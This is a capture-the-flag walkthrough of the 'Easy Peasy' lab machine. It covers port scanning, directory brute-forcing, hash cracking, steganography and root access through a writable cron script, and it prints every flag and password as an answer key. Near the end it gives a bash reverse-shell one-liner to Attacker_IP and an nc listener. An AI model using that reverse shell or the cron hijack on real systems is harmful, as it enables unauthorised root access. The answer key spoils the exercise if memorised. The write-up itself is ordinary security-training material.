  ![Banner](banner.png)
# Easy Peasy

  - [Task 1](#task-1-enumeration-through-nmap)
  - [Task 2](#task-2-compromising-the-machine)

## Task 1 Enumeration through Nmap

<a>First we should check how many ports are open. To do so we will use [nmap](https://nmap.org/). We will use the `-p-` flag to scan all ports.<br>
The full command is `nmap -A -T4 -p- MACHINE_IP`<br>
This can take a long time but nmap returns us the following.</a>

<pre>
  PORT      STATE SERVICE VERSION
<b>80/tcp</b>    open  http    <b>nginx 1.16.1</b>
| http-robots.txt: 1 disallowed entry 
|_/
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.16.1
<b>6498/tcp</b>  open  ssh     <b>OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)</b>
| ssh-hostkey: 
|   2048 30:4a:2b:22:ac:d9:56:09:f2:da:12:20:57:f4:6c:d4 (RSA)
|   256 bf:86:c9:c7:b7:ef:8c:8b:b9:94:ae:01:88:c0:85:4d (ECDSA)
|_  256 a1:72:ef:6c:81:29:13:ef:5a:6c:24:03:4c:fe:3d:0b (ED25519)
<b>65524/tcp</b> open  http    <b>Apache httpd 2.4.43 ((Ubuntu))</b>
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.43 (Ubuntu)
|_http-title: Apache2 Debian Default Page: It works
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
</pre>

So to answer the questions;
1. How many ports are open?<br>
   `3`

<a>To detect the version of [nginx](https://nginx.org) we look at the output above and at port 80 we can see the verison of service running...</a>

2. What is the version of nginx?<br>
   `1.16.1`

<a>The output above also shows the answer to the last question. a.e. service running at port 65524 </a>

3. What is running on the highest port?<br>
   `Apache`


## Task 2 Compromising the machine

<a>We can use [gobuster](https://github.com/OJ/gobuster) or [ffuf](https://github.com/ffuf/ffuf) to search for hidden directories. By using the `-u` flag we can specify a url to attack. As a wordlist we will can use the [`common.txt`](https://github.com/danielmiessler/SecLists/blob/master/Discovery/Web-Content/common.txt), [`rockyou.txt`](https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt) or any of [`seclist`](https://github.com/danielmiessler/SecLists/tree/master/Discovery/Web-Content) wordlist.<br> 
The command: will look like  `gobuster dir -u http://MACHINE_IP -w /path/to/common.txt` for gobuster <br>
and for ffuf `ffuf -u http://MACHINE_IP/FUZZ -w /path/to/common.txt`                </a>

<pre>
<b>hidden</b>                  [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 227ms]
<b>index.html</b>              [Status: 200, Size: 612, Words: 79, Lines: 26, Duration: 182ms]
<b>robots.txt</b>             [Status: 200, Size: 43, Words: 3, Lines: 4, Duration: 579ms]
</pre>

<br>
<a>When visiting the `/hidden` directory there is only a picture and the source code also don't contain any clue. But that cannot be the end,since it was a redirect directory. So runnning a another directory search on the `/hidden` directory.<br>
The command: will look like  `gobuster dir -u http://MACHINE_IP/hidden -w /path/to/common.txt` for gobuster <br>
and for ffuf `ffuf -u http://MACHINE_IP/hidden/FUZZ -w /path/to/common.txt`                </a>

<pre>
<b>index.html</b>              [Status: 200, Size: 390, Words: 47, Lines: 19, Duration: 190ms]
<b>whatever</b>                [Status: 301, Size: 169, Words: 5, Lines: 8, Duration: 188ms]
</pre>

<br>
<a>By visiting the `/whatever` page there again is just a picture. But looking at the source code we can see a a `base64` looking string in it. Let's decode this string: `ZmxhZ3tmMXJzN19mbDRnfQ==`</a><br>
<a>By using the [`CyberChef`](https://gchq.github.io/CyberChef/), I found myself the first flag. </a>

![image](https://github.com/user-attachments/assets/ed3c5861-fa1a-407c-881a-12d846e8188d)

1. What is flag 1?<br>
   `flag{f1rs7_fl4g}`

<a>Till now we enumerated the nginx server. Since, I couldn't find any other flag in the directories so moving ahead looking to the Apache server.So then I could make another gobuster scan to find maybe some directories to retrieve flag.<br>
The command: will look like  `gobuster dir -u http://MACHINE_IP:65524 -w /path/to/common.txt` for gobuster <br>
and for ffuf `ffuf -u http://MACHINE_IP:65524/FUZZ -w /path/to/common.txt`                <br>
Looking at the result...</a>
<pre>
<b>.htpasswd</b>               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 199ms]
<b>.htaccess</b>               [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 201ms]
<b>.hta</b>                    [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 202ms]
<b>index.html</b>              [Status: 200, Size: 10818, Words: 3441, Lines: 371, Duration: 232ms]
<b>robots.txt</b>              [Status: 200, Size: 153, Words: 13, Lines: 7, Duration: 178ms]
<b>server-status</b>           [Status: 403, Size: 279, Words: 20, Lines: 10, Duration: 181ms]
</pre>
<br>

<a>Visiting all directories one by one, I found somethign intresting in the robots.txt.At the User-Agent field there is a string, looking like a `MD5` hash or somehting like that.</a> <br>

<a>To crack the hash I used the online tool [hashes.com](https://hashes.com/en/decrypt/hash). I inserted the hash, and after few seconds I got the second flag.</a>
![image](https://github.com/user-attachments/assets/0cbaace2-8481-4867-825e-04128e3b4012)

2. What is flag 2?<br>
   `flag{1m_s3c0nd_fl4g}`

<a>At apache server there were only 2 possible directory,I could access, one was robots.txt and the other one was index.html , which is the default apache page, So, I started looking into the source code. And found the string that look like `base64` encoded string. </a>
![image](https://github.com/user-attachments/assets/76b5aa97-32c9-4189-a584-44984620fac2)

<a> But it had nothing to do with the flag 3, so I again started looking at the code and found the `flag 3` in the source code. </a>
![image](https://github.com/user-attachments/assets/f8e1dc4e-5a69-4e09-ac8a-d8b5aecaf23e)


3. What is flag 3?<br>
   `flag{9fdafbd64c47471a8f54cd3fc64cd312}`

<a>The next question tells us to search for another hidden diretory. But not so fast. When I looked at the default page I also found another message: `its encoded with ba....:ObsJmP173N2X6dOrAgEAL0Vu`. Which was a `base62` and decoded it at [CyberChef](https://gchq.github.io/CyberChef) .</a>
![image](https://github.com/user-attachments/assets/983a0928-cf02-4b6a-8aff-5b1aedfd6aca)


4. What is the hidden directory?<br>
   `/n0th1ng3ls3m4tt3r`

<a>When visiting the hidden directory we can see another picture, another hash string on the screen. I downloaded for stegnography hoping there maybe a hidden file/string/flag inside the picture. I downloaded the picture by using `wget`.<br>
The command: `wget "http://MACHINE_IP:65524/n0th1ng3ls3m4tt3r/binarycodepixabay.jpg"`<br>
Now we can try [steghide](http://steghide.sourceforge.net) on this picture. With `-sf` we can set a file to extract from.<br>
The full command: `steghide extract -sf binarycodepixabay.jpg`<br>
But it prompts for a pass pharase. So, I assumed the other string in the source code can be hash for the password and the room provides a wordlist. After downloading the wordlist we can start up [John the Ripper](https://www.openwall.com/john/) to crack the password. for this I will be using the specified format i.e. `--format=gost` <br>
The command: `john --wordlist=easypeasy_1596838725703.txt --format=gost hash`</a>

<pre>
Using default input encoding: UTF-8
Loaded 1 password hash (gost, GOST R 34.11-94 [64/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<b>mypasswordforthatjob (?)     </b>
1g 0:00:00:00 DONE (2025-06-07 05:31) 25.00g/s 102400p/s 102400c/s 102400C/s vgazoom4x..flash88
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
</pre>

5. What is the password from the hash?<br>
   `mypasswordforthatjob`

<a> So, using this pass we can use steghide to extract the data from the image file. using teh command 
 `steghide extract -sf binarycodepixabay.jpg.` and we got a file named`secrettext.txt`
We can `cat` out the `secrettext.txt` and see the following.</a>

<pre>
username:boring
password:
01101001 01100011 01101111 01101110 01110110 01100101 01110010 01110100 01100101 01100100 01101101 01111001 01110000 01100001 01110011 01110011 01110111 01101111 01110010 01100100 01110100 01101111 01100010 01101001 01101110 01100001 01110010 01111001
</pre>

<a>A username and a password encoded in binary. Using the [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Binary('Space',8)&input=DQo&ieol=CRLF&oeol=CRLF)'s from binary recipe we can easily  convert binary to plain text.</a>
![image](https://github.com/user-attachments/assets/ecd26d47-b8aa-4e77-a0b4-54daf8a90578)


6. What is the password to login to the machine via SSH?<br>
   `iconvertedmypasswordtobinary`

<a>We have all credentials for an ssh login. After logging in we are in the home directory and can `cat` the `user.txt`.</a>

<pre>
User Flag But It Seems Wrong Like It`s Rotated Or Something
synt{a0jvgf33zfa0ez4y}
</pre>

<a>The flag is 'rotated'. I used an [CyberChef](https://gchq.github.io/CyberChef/#recipe=ROT13(true,true,false,13)&ieol=CRLF&oeol=CRLF)'s ROT 13 recipe and it worked and I got the flag.</a>
![image](https://github.com/user-attachments/assets/b8d861f2-e047-4cce-89a5-764de0d9009e)

7. What is the user flag?<br>
   `flag{n0wits33msn0rm4l}`

<a>Now we have to escalate the privileges to read the root flag. Firstly, I tried looking into the `sudo` privileges given to `boring`</a>

<pre>

boring@kral4-PC:~$ sudo -l 
[sudo] password for boring: 
Sorry, user boring may not run sudo on kral4-PC.

</pre>

So moving ahead I tried looking at the cronjobs with `cat /etc/crontab` shows  cronjobs running as root.</a>

<pre>
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root   test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root   test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root   test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
* *    * * *   root    cd /var/www/ && sudo bash .mysecretcronjob.sh

</pre>

<a>When we look at the `.mysecretcronjob.sh` we have read and write permissions. using command `ls -lah /var/www/.mysecretcronjob.sh`. </a>

<pre>
-rwxr-xr-x 1 boring boring 33 Jun 14  2020 /var/www/.mysecretcronjob.sh
</pre>

That means we can execute commands as privileged user. So we can setup a reverse shell in this bash file and for this I used the online reverse shell generator. [Reverse Shell Generator](https://www.revshells.com/). Now we have to `nano .mysecretcronjob.sh` and paste our reverse shell in that bash file.
`bash -i >& /dev/tcp/Attacker_IP/4444 0>&1` </a>

![image](https://github.com/user-attachments/assets/0c5d9806-5327-47b2-85c8-3debb8a681eb)


<a>And we have to listen for a connection using `nc -lvnp 4444`. So, we setup listner before saving the file. And right after saving file we gets the shell. </a><br>

<a>Now using `ls -lah /root` list all files(including hidden) in the root directory.  </a>

<pre>

ls -lah /root
total 40K
drwx------  5 root root 4.0K Jun 15  2020 .
drwxr-xr-x 23 root root 4.0K Jun 15  2020 ..
-rw-------  1 root root    2 Jun  7 03:09 .bash_history
-rw-r--r--  1 root root 3.1K Jun 15  2020 .bashrc
drwx------  2 root root 4.0K Jun 13  2020 .cache
drwx------  3 root root 4.0K Jun 13  2020 .gnupg
drwxr-xr-x  3 root root 4.0K Jun 13  2020 .local
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-r--r--  1 root root   39 Jun 15  2020 .root.txt
-rw-r--r--  1 root root   66 Jun 14  2020 .selected_editor

</pre>

<br>

<a>There is a `.root.txt` file. So we can simply type `cat /root/.root.txt` and get the final root flag.</a>

<pre>
cat /root/.root.txt
flag{63a9f0ea7bb98050796b649e85481845}
</pre>

8. What is the root flag?<br>
   `flag{63a9f0ea7bb98050796b649e85481845}`
